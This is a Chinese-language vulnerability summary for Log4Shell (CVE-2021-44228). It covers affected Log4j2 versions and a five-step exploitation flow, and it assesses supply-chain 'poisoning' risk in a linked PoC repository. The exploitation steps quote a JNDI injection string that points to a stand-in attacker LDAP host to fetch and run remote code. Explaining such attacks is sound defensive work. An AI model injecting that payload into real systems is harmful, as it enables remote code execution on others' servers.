## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)